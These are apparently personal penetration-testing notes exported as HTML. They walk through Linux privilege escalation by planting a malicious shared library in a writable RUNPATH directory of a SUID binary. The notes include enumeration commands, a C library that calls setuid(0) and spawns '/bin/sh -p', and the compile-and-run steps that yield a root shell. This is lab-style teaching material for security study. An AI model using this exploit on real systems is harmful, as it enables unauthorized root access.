<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Shared Object Injection (RPATH, RUNPATH)</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Shared Object Injection (RPATH, RUNPATH)</h1><br/><br /><br />• When a program is executed, it will try to load the shared objects it requires.<br />• By using a program called <strong>ldd</strong> or <strong>strace</strong>, we can determine the shared object libraries that are being loaded by an executable.<br />• Determine if the application was compiled with RPATH or RUNPATH options.<br />     If yes, can we write into the locations specified by the either of those options?<br /><br /> 0. <a href="entest--Post_Exploitation--Privilege_Escalation--Linux_Privilege_Escalation--Automated_Recon_with_Tools--Linux_Smart_Enumeration_(lse.sh).html">Linux Smart Enumeration(lse.sh)</a><br />    <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ .<span style="color:#ff9d00;font-weight:700">/</span>lse.sh -i <span style="color:#ff9d00;font-weight:700">|</span> <span style="color:#ff9d00;font-weight:700">more</span></pre></div><br />    <a href=""><img src="images/2622-1.png" alt="images/2622-1.png" /></a><br />1. manually locate files with the SUID or SGID bits set in a not standard folder:<br />    <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ <span style="color:#ff9d00;font-weight:700">find</span> <span style="color:#ff9d00;font-weight:700">/</span> -type f -a <span style="color:#333333;font-weight:400">\(</span> -perm -u+s -o -perm -g+s <span style="color:#333333;font-weight:400">\)</span> -exec <span style="color:#ff9d00;font-weight:700">ls</span> -l <span style="color:#ff9d00;font-weight:700">{}</span> <span style="color:#333333;font-weight:400">\;</span> 2&gt; <span style="color:#ff9d00;font-weight:700">/</span>dev<span style="color:#ff9d00;font-weight:700">/</span>null</pre></div><br />    <a href=""><img src="images/2622-2.png" alt="images/2622-2.png" /></a><br />    Check for executable that should execute with <span style="color:#1e90ff;">SUID permissions</span><br /><br /><br />2. Check if the executable was compiled with RPATH or RUNPATH options.<br />    If yes, we will be able to drop our payload in the directories defined by either of those options <br />    <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ objdump -x &lt;executable<span style="color:#ffdd00;font-weight:400">&gt;</span>l <span style="color:#ff9d00;font-weight:700">|</span> <span style="color:#ff9d00;font-weight:700">grep</span> -E <span style="color:#3ad900;font-weight:400">&quot;RPATH|RUNPATH&quot;</span><br />target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ readelf -d payroll  <span style="color:#ff9d00;font-weight:700">|</span> <span style="color:#ff9d00;font-weight:700">grep</span> -E <span style="color:#3ad900;font-weight:400">&quot;RPATH|RUNPATH&quot;</span></pre></div><br />   <a href=""><img src="images/2622-3.png" alt="images/2622-3.png" /></a><br />	<a href=""><img src="images/2622-4.png" alt="images/2622-4.png" /></a><br />	The configuration allows the loading of libraries from the <span style="color:#33d17a;">/development</span> folder, which is writable by all users. This misconfiguration can be exploited by placing a malicious library in <span style="color:#33d17a;">/development</span>, which will take precedence over other folders because entries in this file are checked first (before other folders present in the configuration files).<br />3. Create the <span style="color:#33d17a;">RUNPATH folder specified above</span>. If it not exist already:<br />    <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ <span style="color:#ff9d00;font-weight:700">mkdir</span> <span style="color:#ff9d00;font-weight:700">/</span>development</pre></div><br />4. Choose one of the shared library loaded by the executable and create your own shared library.<br />     find the function name called by the binary.<br />	<div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ ldd &lt;executable&gt;</pre></div><br />	<a href=""><img src="images/2622-5.png" alt="images/2622-5.png" /></a><br />	for example <span style="color:#ff7800;">libshared.so</span>, the program payroll right now when search for the library libshared.so execute it from /lib/x86_64-linux-gnu/libshared.so<br /><br />5. Copy the library chosen (<span style="color:#ff7800;">libshared.so</span>) in the <span style="color:#33d17a;">RUNPATH folder</span> (/development) and check if effectively change it before<br />	<div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">cp</span> <span style="color:#ff9d00;font-weight:700">/</span>lib<span style="color:#ff9d00;font-weight:700">/</span>x86_64-linux-gnu<span style="color:#ff9d00;font-weight:700">/</span>libshared.so <span style="color:#ff9d00;font-weight:700">/</span>development<span style="color:#ff9d00;font-weight:700">/</span>libshared.so</pre></div><br />	<a href=""><img src="images/2622-6.png" alt="images/2622-6.png" /></a><br />	<a href=""><img src="images/2622-7.png" alt="images/2622-7.png" /></a><br />6. Check if we have <span style="color:#ed0feb;">write permission</span> on the <span style="color:#33d17a;">RUNPATH folder</span> (/development)<br />	<div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">ls</span> -la <span style="color:#ff9d00;font-weight:700">/</span>development<span style="color:#ff9d00;font-weight:700">/</span></pre></div><br />	<a href=""><img src="images/2622-8.png" alt="images/2622-8.png" /></a><br />	YES we can continue<br /><br />7. Try to execute the program<br />	<a href=""><img src="images/2622-9.png" alt="images/2622-9.png" /></a><br />	Here there are two possibilities on what write the exploit depending from the output of this commad<br />   ◇ NO ERRORS → use a construct attribute (<a href="ege_Escalation--Linux_Privilege_Escalation--7._SUID-SGID_Executables--Shared_Object_Injection_(RPATH,_RUNPATH)--executable_with_NO_ERRORS.html">Check Subchapter: executable with NO ERRORS</a>)<br />   ◇ <span style="color:#f5c211;">UNDEFINED Symbol</span> → use as function name the symbol that have generated the error<br /><br /><br /><strong><h3>UNDEFINED Symbol</h3></strong><br />8. For example in this case create the file <span style="color:#e01b24;">exploit.c</span> with the following contents:<br />	  Executing the binary throws an error stating that it failed to find the function named <span style="color:#f5c211;">dbquery</span>.<br />	 So we will create one<br />    <div class="codebox"><pre><span style="color:#0088ff;font-weight:400">#include&lt;stdio.h&gt;</span><br /><span style="color:#0088ff;font-weight:400">#include&lt;stdlib.h&gt;</span><br /><br />void <span style="color:#ffdd00;font-weight:400">dbquery()</span> <span style="color:#ff9d00;font-weight:700">{</span><br />    <span style="color:#ff9d00;font-weight:700">printf(</span><span style="color:#3ad900;font-weight:400">&quot;Malicious library loaded\n&quot;</span><span style="color:#ff9d00;font-weight:700">);</span><br />    setuid<span style="color:#ff9d00;font-weight:700">(</span>0<span style="color:#ff9d00;font-weight:700">);</span><br />    system<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">&quot;/bin/sh -p&quot;</span><span style="color:#ff9d00;font-weight:700">);</span><br /><span style="color:#ff9d00;font-weight:700">}</span> </pre></div><br />9. Compile <span style="color:#e01b24;">exploitt.c</span> into the <span style="color:#33d17a;">RUNPATH /development/</span>libshared.so:<br />    <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ <span style="color:#ff9d00;font-weight:700">gcc</span> exploit.c -fPIC -shared -o <span style="color:#ff9d00;font-weight:700">/</span>development<span style="color:#ff9d00;font-weight:700">/</span>libshared.so</pre></div><br />	<a href=""><img src="images/2622-10.png" alt="images/2622-10.png" /></a><br />	no problem for the warning<br />10. Run the SUID executable to get a root shell:<br />    <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>m3b3n<span style="color:#ff9d00;font-weight:700">/</span>payroll</pre></div><br />	<a href=""><img src="images/2622-11.png" alt="images/2622-11.png" /></a><br />    <br /><a href=""><img src="images/2622-12.png" alt="images/2622-12.png" /></a><br /><br />When a Linux application is executed, if it uses Shared Objects, is that it will search for those Shared Objects in the following search order:<br />1. Any directories specified by -rpath-link options. ( RPATH )<br />2. Any directories specified by -rpath options. ( RPATH )<br />3. If the -rpath and -rpath-link options are not used, it will then search the contents of the environment variables LD_RUN_PATH and LD_LIBRARY_PATH.<br />4. Directories defined in the DT_RUNPATH environment variable first, if that doesn’t exist, then the DT_RPATH<br />5. Then, the default lib directories, normally /lib and /usr/lib .<br />6. Finally, any directories defined in the /etc/ld.so.conf file.<br /><br />Bibliography:<br />• <a href="https://www.contextis.com/en/blog/linux-privilege-escalation-via-dynamically-linked-shared-object-library">https://www.contextis.com/en/blog/linux-privilege-escalation-via-dynamically-linked-shared-object-library</a><br />• <a href="https://ftp.gnu.org/old-gnu/Manuals/ld-2.9.1/html_node/ld_3.html">https://ftp.gnu.org/old-gnu/Manuals/ld-2.9.1/html_node/ld_3.html</a></div>
</body>
</html>
